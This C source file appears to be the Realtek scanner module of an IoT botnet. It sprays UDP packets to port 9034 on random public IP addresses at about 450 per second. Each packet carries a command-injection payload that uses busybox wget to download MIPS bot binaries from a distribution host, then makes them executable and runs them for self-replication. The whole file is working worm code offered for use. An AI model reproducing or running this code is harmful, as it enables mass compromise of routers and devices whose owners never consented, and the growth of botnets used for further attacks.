#define _GNU_SOURCE
#include "headers/scanner.h"
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/time.h>
#include <pthread.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>


#define REALTEK_PORT 9034 

// udp, we dont need threads, just pps
//no concurrents, retries
#define MAX_SENDS_PER_SECOND 450



static const unsigned int excludes[] = {
    0x00000000,  // 0.0.0.0/8
    0x0A000000,  // 10.0.0.0/8
    0x7F000000,  // 127.0.0.0/8
    0xA9FE0000,  // 169.254.0.0/16
    0xAC100000,  // 172.16.0.0/12
    0xC0A80000,  // 192.168.0.0/16
    0x64400000,  // 100.64.0.0/10
    0x0F000000,  // 15.0.0.0/8
    0x10000000,  // 16.0.0.0/8
    0x38000000,  // 56.0.0.0/8
    0x03000000,  // 3.0.0.0/8
    0xC6120000,  // 198.18.0.0/15
    0
};

static int is_excluded(unsigned int ip) {
    ip = htonl(ip);
    for(int i = 0; excludes[i]; i++) {
        unsigned int excluded_ip = excludes[i];
        if (excluded_ip == 0x7F000000) {
            if ((ip >> 24) == 0x7F)
                return 1;
        } else if ((ip & 0xFF000000) == excluded_ip) {
            return 1;
        }
    }
    return 0;
}


static volatile int realtek_scanner_active = 0;
static pthread_t realtek_scanner_thread_id;

static void* realtek_scanner_thread_func(void* arg) {
    srand(time(NULL));
    while (realtek_scanner_active) {
        time_t start = time(NULL);
        for (int i = 0; i < MAX_SENDS_PER_SECOND; i++) {
            if (!realtek_scanner_active) break;
            unsigned int ip1 = rand() % 255;
            if(is_excluded(ip1 << 24)) { i--; continue; }
            char ip[20];
            snprintf(ip, sizeof(ip), "%u.%d.%d.%d", ip1, rand() % 255, rand() % 255, rand() % 255);
            int sock = socket(AF_INET, SOCK_DGRAM, 0);
            if (sock < 0) continue;
            struct sockaddr_in addr;
            addr.sin_family = AF_INET;
            addr.sin_port = htons(REALTEK_PORT);
            addr.sin_addr.s_addr = inet_addr(ip);
            char payload[256];
            snprintf(payload, sizeof(payload),
                "orf; cd /tmp; /bin/busybox wget http://%s/mipsel; chmod 777 mipsel; ./mipsel selfrep.realtek; /bin/busybox wget http://%s/mips; chmod 777 mips; ./mips selfrep.realtek",
                BINSERVER, BINSERVER);
            sendto(sock, payload, strlen(payload), 0, (struct sockaddr*)&addr, sizeof(addr));
            close(sock);
        }
        time_t end = time(NULL);
        if (end == start) {
            usleep(1000000 - (useconds_t)((clock() % CLOCKS_PER_SEC) * (1000000 / CLOCKS_PER_SEC)));
        }
    }
    return NULL;
}

void start_realtek_scanner(void) {
    if (realtek_scanner_active) return;
    realtek_scanner_active = 1;
    pthread_create(&realtek_scanner_thread_id, NULL, realtek_scanner_thread_func, NULL);
}

void stop_realtek_scanner(void) {
    if (!realtek_scanner_active) return;
    realtek_scanner_active = 0;
    pthread_join(realtek_scanner_thread_id, NULL);
}
